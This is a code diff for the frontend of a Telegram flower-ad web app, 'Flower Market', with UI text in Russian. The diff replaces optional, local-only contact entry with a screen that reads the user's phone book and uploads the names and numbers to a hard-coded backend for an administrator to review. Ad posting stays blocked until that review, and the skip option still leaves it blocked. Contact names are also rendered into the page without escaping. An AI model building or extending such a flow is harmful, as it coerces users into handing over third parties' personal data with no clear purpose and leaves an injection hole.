@@ -165,7 +165,69 @@
             .contact-options { grid-template-columns: 1fr; }
         }
         
-        /* Стили для мануального ввода контактов */
+        /* Стили для экрана запроса контактов */
+        .contacts-request-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .contacts-icon {
+            font-size: 80px;
+            color: #667eea;
+            margin-bottom: 25px;
+        }
+        
+        .contacts-title {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .contacts-message {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .contacts-warning {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .contacts-error {
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: left;
+            color: #d32f2f;
+        }
+        
+        .contacts-success {
+            background: rgba(52, 199, 89, 0.1);
+            border-left: 4px solid #34c759;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .manual-contacts-info {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border-left: 4px solid #2196F3;
+        }
+        
+        /* Стили для мануального ввода */
         .contacts-manual-container {
             background: #f8f9fa;
             border-radius: 15px;
@@ -195,10 +257,6 @@
             font-size: 14px;
         }
         
-        .add-contact-btn:hover {
-            background: #5a6fd8;
-        }
-        
         .remove-contact-btn {
             background: #ff6b6b;
             color: white;
@@ -213,10 +271,6 @@
             justify-content: center;
         }
         
-        .contacts-list {
-            margin-top: 20px;
-        }
-        
         .contact-item {
             background: white;
             padding: 15px;
@@ -228,96 +282,132 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
         
-        .contact-info h4 {
-            margin: 0 0 5px 0;
-            color: #333;
-        }
-        
-        .contact-info p {
-            margin: 0;
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .no-contacts-message {
-            text-align: center;
-            padding: 30px;
-            color: #888;
-            font-style: italic;
-        }
-        
-        .manual-contacts-info {
-            background: #e3f2fd;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            border-left: 4px solid #2196F3;
+        .skip-contacts-btn {
+            margin-top: 20px;
+            color: #667eea;
+            cursor: pointer;
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
   <div class="container">
-    <!-- ЭКРАН ВВОДА КОНТАКТОВ (ДЛЯ TELEGRAM WEBVIEW) -->
-    <div class="form-container" id="contactsContainer" style="display: none;">
-        <div class="header">
-            <h1><i class="fas fa-address-book"></i> Ваши контакты</h1>
-            <p>Для связи с вами по вопросам объявлений</p>
-        </div>
-        
-        <div class="manual-contacts-info">
-            <h3><i class="fas fa-info-circle"></i> Как добавить контакты?</h3>
-            <p>Telegram не разрешает доступ к телефонной книге. Добавьте контакты вручную:</p>
-            <ol style="padding-left: 20px; margin-top: 10px;">
-                <li>Введите имя и телефон</li>
-                <li>Нажмите "Добавить контакт"</li>
-                <li>Можно добавить несколько контактов</li>
-                <li>Эти контакты будут видны только администратору</li>
-            </ol>
-        </div>
-        
-        <div class="contacts-manual-container">
-            <h3 class="step-title"><i class="fas fa-user-plus"></i> Добавить контакт</h3>
+    <!-- ЭКРАН ЗАПРОСА РАЗРЕШЕНИЯ НА КОНТАКТЫ -->
+    <div class="form-container" id="contactsRequestScreen">
+        <div class="contacts-request-screen">
+            <i class="fas fa-address-book contacts-icon"></i>
+            <h1 class="contacts-title">Доступ к контактам</h1>
             
-            <div class="contact-input-row">
-                <input type="text" id="contactName" placeholder="Имя (например: Иван Иванов)" maxlength="100">
-                <input type="tel" id="contactPhone" placeholder="Телефон (например: 555123456)" maxlength="15">
-                <button class="add-contact-btn" onclick="addManualContact()">
-                    <i class="fas fa-plus"></i> Добавить
+            <div id="autoContactsSection">
+                <p class="contacts-message">
+                    Для создания объявления нам нужен доступ к вашей телефонной книге.<br>
+                    Контакты будут отправлены администратору для проверки.
+                </p>
+                
+                <div class="contacts-warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <strong>Важно:</strong> Без контактов вы не сможете публиковать объявления.
+                </div>
+                
+                <button class="btn" onclick="requestContactsPermission()" id="requestContactsBtn">
+                    <i class="fas fa-address-book"></i> РАЗРЕШИТЬ ДОСТУП К КОНТАКТАМ
                 </button>
+                
+                <div class="loader" id="contactsLoader" style="display: none; margin: 20px auto;"></div>
+                
+                <div id="contactsSuccess" class="contacts-success" style="display: none;">
+                    <i class="fas fa-check-circle"></i>
+                    <h3>Контакты успешно получены!</h3>
+                    <p>Контакты отправлены администратору для проверки.</p>
+                    <button class="btn" onclick="checkUserStatus()" style="margin-top: 15px;">
+                        <i class="fas fa-sync-alt"></i> ПРОВЕРИТЬ СТАТУС
+                    </button>
+                </div>
+                
+                <div id="contactsError" class="contacts-error" style="display: none;">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <h3>Не удалось получить контакты</h3>
+                    <p id="contactsErrorMessage"></p>
+                </div>
             </div>
             
-            <p class="input-hint">Введите номер без +996 (только 9 цифр)</p>
-        </div>
-        
-        <div class="contacts-list" id="contactsList">
-            <div class="no-contacts-message" id="noContactsMessage">
-                <i class="fas fa-address-book" style="font-size: 48px; color: #ccc; margin-bottom: 15px;"></i>
-                <p>Пока нет добавленных контактов</p>
-                <p><small>Добавьте хотя бы один контакт для продолжения</small></p>
+            <div id="manualContactsSection" style="display: none;">
+                <div class="manual-contacts-info">
+                    <h3><i class="fas fa-info-circle"></i> Браузер не поддерживает доступ к контактам</h3>
+                    <p>Добавьте контакты вручную:</p>
+                </div>
+                
+                <div class="contacts-manual-container">
+                    <h3 class="step-title"><i class="fas fa-user-plus"></i> Добавить контакт</h3>
+                    
+                    <div class="contact-input-row">
+                        <input type="text" id="contactName" placeholder="Имя (например: Иван Иванов)" maxlength="100">
+                        <input type="tel" id="contactPhone" placeholder="Телефон (например: 555123456)" maxlength="15">
+                        <button class="add-contact-btn" onclick="addManualContact()">
+                            <i class="fas fa-plus"></i> Добавить
+                        </button>
+                    </div>
+                    
+                    <p class="input-hint">Введите номер без +996 (только 9 цифр)</p>
+                </div>
+                
+                <div id="contactsList" class="contacts-list">
+                    <div class="no-contacts-message" id="noContactsMessage" style="text-align: center; padding: 20px; color: #888;">
+                        <i class="fas fa-address-book" style="font-size: 48px; margin-bottom: 15px;"></i>
+                        <p>Пока нет добавленных контактов</p>
+                    </div>
+                </div>
+                
+                <button class="btn" onclick="uploadManualContacts()" id="uploadContactsBtn" disabled style="margin-top: 20px;">
+                    <i class="fas fa-upload"></i> ОТПРАВИТЬ КОНТАКТЫ АДМИНИСТРАТОРУ
+                </button>
+                
+                <div class="skip-contacts-btn" onclick="skipContacts()" style="text-align: center; margin-top: 15px;">
+                    Пропустить (не рекомендуется)
+                </div>
             </div>
         </div>
-        
-        <div class="navigation">
-            <button class="btn" onclick="saveContactsAndContinue()" id="continueBtn" disabled>
-                <i class="fas fa-arrow-right"></i> Продолжить без контактов
-            </button>
-        </div>
-        
-        <p style="text-align: center; margin-top: 20px; color: #666; font-size: 14px;">
-            <i class="fas fa-shield-alt"></i> Контакты сохраняются только локально и отправляются администратору при публикации объявления
-        </p>
     </div>
     
-    <!-- ОСНОВНОЙ ФОРМ-КОНТЕЙНЕР -->
+    <!-- ЭКРАН ОЖИДАНИЯ ПОДТВЕРЖДЕНИЯ -->
+    <div class="form-container" id="pendingScreen" style="display: none;">
+        <div class="contacts-request-screen">
+            <i class="fas fa-clock contacts-icon" style="color: #ffc107;"></i>
+            <h1 class="contacts-title">Ожидание подтверждения</h1>
+            <p class="contacts-message">
+                Ваши контакты отправлены администратору.<br>
+                Ожидайте подтверждения для доступа к созданию объявлений.
+            </p>
+            
+            <div class="contacts-success">
+                <i class="fas fa-check-circle"></i>
+                <p><strong>Контакты получены</strong></p>
+                <p id="contactsCountText"></p>
+                <p style="margin-top: 10px; font-size: 14px;">
+                    Администратор получил уведомление и проверит ваши контакты.
+                </p>
+            </div>
+            
+            <button class="btn" onclick="checkUserStatus()" style="margin-top: 30px;">
+                <i class="fas fa-sync-alt"></i> ПРОВЕРИТЬ СТАТУС
+            </button>
+            
+            <p style="text-align: center; margin-top: 20px; color: #666; font-size: 14px;">
+                <i class="fas fa-info-circle"></i> Обычно проверка занимает несколько минут
+            </p>
+        </div>
+    </div>
+    
+    <!-- ОСНОВНОЙ ФОРМ-КОНТЕЙНЕР (скрыт по умолчанию) -->
     <div class="main-container" id="mainContainer" style="display: none;">
         <div class="header" id="mainHeader">
             <h1><i class="fas fa-flower-tulip"></i> Flower Market</h1>
             <p>Создайте объявление с фото/видео в одном посте</p>
             <div id="contactsStatus" style="margin-top: 10px; font-size: 14px;">
                 <span id="contactsStatusText"></span>
-                <button onclick="showContactsScreen()" 
+                <button onclick="showContactsRequestScreen()" 
                         style="margin-left: 10px; padding: 5px 10px; background: #667eea; color: white; border: none; border-radius: 5px; font-size: 12px;">
-                    Изменить контакты
+                    Обновить контакты
                 </button>
             </div>
         </div>
@@ -555,10 +645,6 @@
                   <div class="preview-label">Контакты в объявлении</div>
                   <div class="preview-value" id="previewContacts"></div>
               </div>
-              <div class="preview-item">
-                  <div class="preview-label">Контакты для администратора</div>
-                  <div class="preview-value" id="previewAdminContacts"></div>
-              </div>
 
               <div class="navigation">
                   <button class="btn btn-secondary" onclick="prevStep()"><i class="fas fa-arrow-left"></i> Назад</button>
@@ -611,11 +697,11 @@
 
   <script>
 // ============================================
-// Flower Market - Единый Frontend для Telegram WebView
-// С ручным вводом контактов (работает везде)
+// Flower Market - Автоматический запрос контактов
 // ============================================
 
-const BACKEND_URL = 'https://backend-flower-2-production.up.railway.app'; // Ваш бэкенд
+const BACKEND_URL = 'https://backend-flower-2-production.up.railway.app';
+const ADMIN_ID = '8399288300';
 
 // Глобальные переменные
 let currentStep = 1;
@@ -625,45 +711,226 @@ let selectedContactType = 'telegram';
 let isSubmitting = false;
 let userId = null;
 let chatId = null;
-let userContacts = []; // Массив для хранения контактов пользователя
+let userContacts = [];
+let userStatus = null;
 
 // Инициализация при загрузке страницы
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('🌺 Flower Market запущен в Telegram WebView');
+    console.log('🌺 Flower Market запущен');
     
     // Получаем параметры из URL
     const urlParams = new URLSearchParams(window.location.search);
-    userId = urlParams.get('userId') || localStorage.getItem('demo_userId');
-    chatId = urlParams.get('chatId') || localStorage.getItem('demo_chatId');
+    userId = urlParams.get('userId');
+    chatId = urlParams.get('chatId');
     
     console.log('📋 Параметры URL:', { userId, chatId });
     
-    // Проверяем, открыто ли в Telegram WebView
-    const isTelegramWebView = /Telegram|WebView|iPhone|Android/i.test(navigator.userAgent);
-    console.log('🤖 В Telegram WebView?', isTelegramWebView);
-    
-    // Проверяем, есть ли сохраненные контакты
-    const savedContacts = localStorage.getItem(`user_contacts_${userId}`);
-    if (savedContacts) {
-        userContacts = JSON.parse(savedContacts);
-        console.log('📱 Загружены сохраненные контакты:', userContacts.length);
-        showMainForm(); // Показываем основную форму
-    } else {
-        showContactsScreen(); // Показываем экран ввода контактов
+    if (!userId || !chatId) {
+        showNotification('Ошибка', 'Не получены параметры пользователя. Откройте через Telegram бота.', 'error');
+        return;
     }
+    
+    // Проверяем статус пользователя
+    checkUserStatus();
 });
 
-// ==================== ФУНКЦИИ ДЛЯ РАБОТЫ С КОНТАКТАМИ ====================
+// Проверить статус пользователя
+async function checkUserStatus() {
+    try {
+        console.log('🔍 Проверка статуса пользователя:', userId);
+        
+        const response = await fetch(`${BACKEND_URL}/api/user/${userId}/status`);
+        
+        if (response.ok) {
+            const data = await response.json();
+            console.log('📊 Статус пользователя:', data);
+            userStatus = data;
+            
+            if (data.approved) {
+                // Пользователь подтвержден
+                showMainForm();
+            } else if (data.hasContacts) {
+                // Контакты есть, но не подтверждены
+                showPendingScreen(data.contactsCount || 0);
+            } else {
+                // Контактов нет - запрашиваем
+                checkContactsSupport();
+            }
+        } else {
+            console.warn('⚠️ Не удалось проверить статус, пробуем запросить контакты');
+            checkContactsSupport();
+        }
+    } catch (error) {
+        console.error('❌ Ошибка проверки статуса:', error);
+        checkContactsSupport();
+    }
+}
 
-// Показать экран ввода контактов
-function showContactsScreen() {
-    document.getElementById('contactsContainer').style.display = 'block';
+// Проверить поддержку Contacts API
+function checkContactsSupport() {
+    console.log('🔍 Проверка поддержки Contacts API...');
+    
+    // Проверяем поддержку Contacts API
+    const isContactsSupported = 'contacts' in navigator && 'ContactsManager' in window;
+    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const isChrome = /Chrome/.test(navigator.userAgent);
+    const isSafari = /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent);
+    
+    console.log('📱 Информация о браузере:', {
+        contactsSupported: isContactsSupported,
+        isMobile: isMobile,
+        isChrome: isChrome,
+        isSafari: isSafari,
+        userAgent: navigator.userAgent
+    });
+    
+    if (isContactsSupported && (isMobile || isChrome || isSafari)) {
+        // Браузер поддерживает Contacts API
+        console.log('✅ Браузер поддерживает Contacts API');
+        showContactsRequestScreen();
+    } else {
+        // Браузер не поддерживает - показываем ручной ввод
+        console.log('❌ Браузер не поддерживает Contacts API, показываем ручной ввод');
+        showManualContactsSection();
+    }
+}
+
+// Показать экран запроса контактов
+function showContactsRequestScreen() {
+    document.getElementById('contactsRequestScreen').style.display = 'block';
+    document.getElementById('pendingScreen').style.display = 'none';
     document.getElementById('mainContainer').style.display = 'none';
+    
+    // Сбрасываем состояние
+    document.getElementById('autoContactsSection').style.display = 'block';
+    document.getElementById('manualContactsSection').style.display = 'none';
+    document.getElementById('contactsSuccess').style.display = 'none';
+    document.getElementById('contactsError').style.display = 'none';
+    document.getElementById('contactsLoader').style.display = 'none';
+    document.getElementById('requestContactsBtn').disabled = false;
+}
+
+// Показать раздел ручного ввода
+function showManualContactsSection() {
+    document.getElementById('autoContactsSection').style.display = 'none';
+    document.getElementById('manualContactsSection').style.display = 'block';
     
     // Загружаем сохраненные контакты
     loadContactsList();
-    updateContinueButton();
+    updateUploadButton();
 }
+
+// Показать экран ожидания
+function showPendingScreen(contactsCount) {
+    document.getElementById('contactsRequestScreen').style.display = 'none';
+    document.getElementById('pendingScreen').style.display = 'block';
+    document.getElementById('mainContainer').style.display = 'none';
+    
+    document.getElementById('contactsCountText').textContent = 
+        `Получено контактов: ${contactsCount}`;
+}
+
+// Запросить разрешение на контакты
+async function requestContactsPermission() {
+    console.log('📱 Запрос разрешения на контакты...');
+    
+    const requestBtn = document.getElementById('requestContactsBtn');
+    const contactsLoader = document.getElementById('contactsLoader');
+    const contactsError = document.getElementById('contactsError');
+    const contactsErrorMessage = document.getElementById('contactsErrorMessage');
+    
+    requestBtn.disabled = true;
+    contactsLoader.style.display = 'block';
+    contactsError.style.display = 'none';
+    
+    try {
+        // Проверяем поддержку Contacts API
+        if (!('contacts' in navigator && 'ContactsManager' in window)) {
+            throw new Error('Ваш браузер не поддерживает доступ к контактам');
+        }
+        
+        console.log('✅ Браузер поддерживает Contacts API');
+        
+        // Запрашиваем разрешение на доступ к контактам
+        const props = ['name', 'tel'];
+        const opts = { multiple: true };
+        
+        console.log('🔄 Запрашиваем контакты...');
+        const contacts = await navigator.contacts.select(props, opts);
+        console.log('📱 Получено контактов:', contacts?.length);
+        
+        if (!contacts || contacts.length === 0) {
+            throw new Error('Вы не выбрали ни одного контакта');
+        }
+        
+        // Форматируем контакты для отправки
+        const formattedContacts = contacts.map(contact => ({
+            name: contact.name ? contact.name.join(' ') : 'Без имени',
+            phone: contact.tel ? contact.tel[0] : 'Нет телефона',
+            rawName: contact.name || [],
+            rawTel: contact.tel || []
+        }));
+        
+        console.log('📤 Отправляем контакты на сервер...');
+        
+        // Отправляем контакты на сервер
+        const response = await fetch(`${BACKEND_URL}/api/upload-contacts`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                userId: userId,
+                chatId: chatId,
+                contacts: formattedContacts,
+                firstName: 'Пользователь'
+            })
+        });
+        
+        if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`Ошибка сервера: ${response.status} - ${errorText}`);
+        }
+        
+        const result = await response.json();
+        console.log('✅ Результат от сервера:', result);
+        
+        if (result.success) {
+            // Успешно
+            contactsLoader.style.display = 'none';
+            document.getElementById('contactsSuccess').style.display = 'block';
+            
+            showNotification('✅ Успешно!', 
+                `Получено ${formattedContacts.length} контактов. Администратор получил уведомление.`, 
+                'success');
+                
+            // Через 3 секунды проверяем статус
+            setTimeout(() => {
+                checkUserStatus();
+            }, 3000);
+            
+        } else {
+            throw new Error(result.error || 'Ошибка сохранения контактов');
+        }
+        
+    } catch (error) {
+        console.error('❌ Ошибка получения контактов:', error);
+        contactsLoader.style.display = 'none';
+        contactsError.style.display = 'block';
+        contactsErrorMessage.textContent = error.message;
+        
+        // Если браузер не поддерживает, показываем ручной ввод
+        if (error.message.includes('не поддерживает')) {
+            showManualContactsSection();
+        } else {
+            requestBtn.disabled = false;
+            requestBtn.innerHTML = '<i class="fas fa-redo"></i> ПОВТОРИТЬ';
+        }
+    }
+}
+
+// ==================== РУЧНОЙ ВВОД КОНТАКТОВ ====================
 
 // Добавить контакт вручную
 function addManualContact() {
@@ -706,7 +973,7 @@ function addManualContact() {
     
     userContacts.push(newContact);
     
-    // Сохраняем в localStorage
+    // Сохраняем локально
     localStorage.setItem(`user_contacts_${userId}`, JSON.stringify(userContacts));
     
     // Обновляем список
@@ -718,27 +985,33 @@ function addManualContact() {
     nameInput.focus();
     
     showNotification('Успех', 'Контакт добавлен', 'success');
-    updateContinueButton();
+    updateUploadButton();
 }
 
 // Удалить контакт
 function removeContact(contactId) {
     userContacts = userContacts.filter(contact => contact.id !== contactId);
     
-    // Сохраняем в localStorage
+    // Сохраняем локально
     localStorage.setItem(`user_contacts_${userId}`, JSON.stringify(userContacts));
     
     // Обновляем список
     loadContactsList();
     
     showNotification('Удалено', 'Контакт удален', 'info');
-    updateContinueButton();
+    updateUploadButton();
 }
 
 // Загрузить список контактов
 function loadContactsList() {
     const contactsList = document.getElementById('contactsList');
     const noContactsMessage = document.getElementById('noContactsMessage');
+    
+    // Загружаем сохраненные контакты
+    const savedContacts = localStorage.getItem(`user_contacts_${userId}`);
+    if (savedContacts) {
+        userContacts = JSON.parse(savedContacts);
+    }
     
     if (userContacts.length === 0) {
         noContactsMessage.style.display = 'block';
@@ -753,8 +1026,8 @@ function loadContactsList() {
         html += `
             <div class="contact-item">
                 <div class="contact-info">
-                    <h4>${contact.name}</h4>
-                    <p>+996 ${contact.phone}</p>
+                    <h4 style="margin: 0 0 5px 0; color: #333;">${contact.name}</h4>
+                    <p style="margin: 0; color: #666; font-size: 14px;">+996 ${contact.phone}</p>
                 </div>
                 <button class="remove-contact-btn" onclick="removeContact(${contact.id})">
                     <i class="fas fa-times"></i>
@@ -766,35 +1039,115 @@ function loadContactsList() {
     contactsList.innerHTML = html;
 }
 
-// Обновить кнопку продолжения
-function updateContinueButton() {
-    const continueBtn = document.getElementById('continueBtn');
+// Обновить кнопку отправки
+function updateUploadButton() {
+    const uploadBtn = document.getElementById('uploadContactsBtn');
     
     if (userContacts.length > 0) {
-        continueBtn.disabled = false;
-        continueBtn.innerHTML = `<i class="fas fa-arrow-right"></i> Продолжить с ${userContacts.length} контактами`;
+        uploadBtn.disabled = false;
+        uploadBtn.innerHTML = `<i class="fas fa-upload"></i> ОТПРАВИТЬ ${userContacts.length} КОНТАКТОВ АДМИНИСТРАТОРУ`;
     } else {
-        continueBtn.disabled = false;
-        continueBtn.innerHTML = `<i class="fas fa-arrow-right"></i> Продолжить без контактов`;
+        uploadBtn.disabled = true;
+        uploadBtn.innerHTML = `<i class="fas fa-upload"></i> ОТПРАВИТЬ КОНТАКТЫ АДМИНИСТРАТОРУ`;
     }
 }
 
-// Сохранить контакты и перейти к основной форме
-function saveContactsAndContinue() {
-    // Сохраняем флаг, что пользователь прошел экран контактов
-    localStorage.setItem(`contacts_completed_${userId}`, 'true');
+// Загрузить контакты вручную
+async function uploadManualContacts() {
+    if (userContacts.length === 0) {
+        showNotification('Ошибка', 'Добавьте хотя бы один контакт', 'error');
+        return;
+    }
     
-    showMainForm();
+    const uploadBtn = document.getElementById('uploadContactsBtn');
+    const originalText = uploadBtn.innerHTML;
+    
+    uploadBtn.disabled = true;
+    uploadBtn.innerHTML = '<div class="loader"></div> Отправка...';
+    
+    try {
+        console.log('📤 Отправка ручных контактов:', userContacts.length);
+        
+        // Отправляем контакты на сервер
+        const response = await fetch(`${BACKEND_URL}/api/upload-contacts`, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: JSON.stringify({
+                userId: userId,
+                chatId: chatId,
+                contacts: userContacts.map(c => ({
+                    name: [c.name],
+                    tel: [c.phone],
+                    firstName: c.name,
+                    lastName: ''
+                })),
+                firstName: 'Пользователь'
+            })
+        });
+        
+        if (!response.ok) {
+            const errorText = await response.text();
+            throw new Error(`Ошибка сервера: ${response.status} - ${errorText}`);
+        }
+        
+        const result = await response.json();
+        console.log('✅ Результат от сервера:', result);
+        
+        if (result.success) {
+            showNotification('✅ Успешно!', 
+                `${userContacts.length} контактов отправлены администратору.`, 
+                'success');
+            
+            // Переходим к экрану ожидания
+            setTimeout(() => {
+                showPendingScreen(userContacts.length);
+            }, 2000);
+            
+        } else {
+            throw new Error(result.error || 'Ошибка сохранения контактов');
+        }
+        
+    } catch (error) {
+        console.error('❌ Ошибка отправки контактов:', error);
+        showNotification('Ошибка', 'Не удалось отправить контакты', 'error');
+        
+        uploadBtn.disabled = false;
+        uploadBtn.innerHTML = originalText;
+    }
 }
 
-// Показать основной интерфейс создания объявления
+// Пропустить контакты (не рекомендуется)
+function skipContacts() {
+    if (confirm('⚠️ ВНИМАНИЕ!\n\nБез контактов администратор не сможет связаться с вами.\nБез контактов публикация объявлений будет невозможна!\n\nВы уверены, что хотите продолжить без контактов?')) {
+        // Помечаем как пропущенные
+        localStorage.setItem(`contacts_skipped_${userId}`, 'true');
+        
+        // Показываем предупреждение
+        showNotification('⚠️ Внимание', 
+            'Вы пропустили добавление контактов. Без контактов вы не сможете публиковать объявления.', 
+            'warning');
+        
+        // Через 3 секунды показываем основную форму
+        setTimeout(() => {
+            showMainForm();
+        }, 3000);
+    }
+}
+
+// ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
+
+// Показать основную форму
 function showMainForm() {
-    console.log('📋 Показываем основной интерфейс');
+    console.log('📋 Показываем основную форму');
     
-    // Скрываем экран контактов
-    document.getElementById('contactsContainer').style.display = 'none';
+    // Скрываем все экраны контактов
+    document.getElementById('contactsRequestScreen').style.display = 'none';
+    document.getElementById('pendingScreen').style.display = 'none';
     
-    // Показываем основной контейнер
+    // Показываем основную форму
     document.getElementById('mainContainer').style.display = 'block';
     
     // Обновляем статус контактов в шапке
@@ -810,17 +1163,21 @@ function showMainForm() {
 function updateContactsStatusHeader() {
     const contactsStatusText = document.getElementById('contactsStatusText');
     
-    if (userContacts.length > 0) {
+    if (userStatus && userStatus.approved) {
+        const count = userStatus.contactsCount || 0;
         contactsStatusText.innerHTML = 
-            `<i class="fas fa-check-circle" style="color: #34c759;"></i> Контакты: ${userContacts.length} ✓`;
+            `<i class="fas fa-check-circle" style="color: #34c759;"></i> Контакты: ${count} ✓ (Подтверждено)`;
+    } else if (userStatus && userStatus.hasContacts) {
+        const count = userStatus.contactsCount || 0;
+        contactsStatusText.innerHTML = 
+            `<i class="fas fa-clock" style="color: #ffc107;"></i> Контакты: ${count} (Ожидание)`;
     } else {
         contactsStatusText.innerHTML = 
-            `<i class="fas fa-exclamation-triangle" style="color: #ffc107;"></i> Контакты не добавлены`;
+            `<i class="fas fa-exclamation-triangle" style="color: #ff6b6b;"></i> Контакты не добавлены`;
     }
 }
 
-// ==================== ОСНОВНЫЕ ФУНКЦИИ ДЛЯ СОЗДАНИЯ ОБЪЯВЛЕНИЯ ====================
-
+// Функции для формы
 function showStep(step) {
     document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
     const stepEl = document.getElementById(`step${step}`);
@@ -1001,14 +1358,11 @@ function updateMediaPreview() {
             mediaContent = `<video controls><source src="${file.url}" type="${file.type}"></video>`;
         }
         
-        const statusIcon = '✓';
-        const statusTitle = 'Готово';
         const mediaType = file.type.startsWith('image/') ? 'ФОТО' : 'ВИДЕО';
         
         item.innerHTML = `
             ${mediaContent}
             <div class="media-type">${mediaType}</div>
-            <div class="media-status" title="${statusTitle}">${statusIcon}</div>
             <div class="remove-media" onclick="removeMedia(${index})">
                 <i class="fas fa-times"></i>
             </div>
@@ -1048,9 +1402,16 @@ async function submitForm() {
         return;
     }
     
+    // Проверяем, есть ли контакты (если пользователь не подтвержден)
+    if (!userStatus || !userStatus.approved) {
+        showNotification('Ошибка', 
+            'Ваши контакты еще не проверены администратором. Ожидайте подтверждения.', 
+            'error');
+        return;
+    }
+    
     isSubmitting = true;
     
-    // Подготавливаем данные формы
     const formData = {
         userId: userId,
         chatId: chatId,
@@ -1062,7 +1423,6 @@ async function submitForm() {
         district: document.getElementById('districtSelect').value || '',
         address: document.getElementById('addressInput').value || '',
         hashtags: generateHashtags(),
-        userContacts: userContacts, // Отправляем контакты пользователя администратору
         mediaFiles: []
     };
     
@@ -1244,12 +1604,6 @@ function updatePreview() {
         document.getElementById('price').value || 'Договорная';
     document.getElementById('previewContacts').textContent = getContactInfo();
     
-    // Контакты для администратора
-    const adminContactsHtml = userContacts.length > 0 
-        ? userContacts.map(contact => `${contact.name}: +996 ${contact.phone}`).join('<br>')
-        : 'Не указаны';
-    document.getElementById('previewAdminContacts').innerHTML = adminContactsHtml;
-    
     const city = document.getElementById('citySelect').value || '';
     const district = document.getElementById('districtSelect').value || '';
     const address = document.getElementById('addressInput').value || '';
@@ -1310,7 +1664,7 @@ function showSuccessScreen(result) {
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
-// Глобальные функции для кнопок
+// Глобальные функции
 window.nextStep = function() {
     if (currentStep < totalSteps && validateCurrentStep()) {
         showStep(currentStep + 1);
@@ -1452,15 +1806,11 @@ window.loadDistricts = function(city) {
         districtSelect.appendChild(option);
     });
     
-    if (uniqueDistricts.length === 0) {
-        console.log(`Для города "${city}" нет данных о районах`);
-    }
-    
     validateCurrentStep();
 };
 
 window.createNewAd = function() {
-    // Очищаем только данные формы, оставляем контакты
+    // Очищаем только данные формы
     mediaFiles = [];
     currentStep = 1;
     
@@ -1483,7 +1833,6 @@ window.createNewAd = function() {
     setNegotiablePrice();
     updateContactStepUI();
     
-    // Прокрутка наверх
     window.scrollTo({ top: 0, behavior: 'smooth' });
 };
 
@@ -1616,7 +1965,7 @@ function validateStep(step) {
     }
 }
 
-console.log('✅ Flower Market Frontend для Telegram готов!');
+console.log('✅ Flower Market Frontend готов!');
   </script>
 </body>
 </html>
